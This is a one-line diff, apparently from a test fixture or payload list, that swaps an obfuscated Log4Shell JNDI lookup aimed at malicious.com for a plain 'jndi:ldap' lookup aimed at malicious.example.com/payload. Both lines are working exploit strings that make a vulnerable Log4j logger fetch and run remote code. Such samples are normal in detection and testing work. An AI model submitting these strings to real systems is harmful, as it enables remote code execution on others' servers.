@@ -1,1 +1,1 @@
-${${env:ENV_NAME:-j}ndi${::-:}ldap://malicious.com/}
+${jndi:ldap://malicious.example.com/payload}
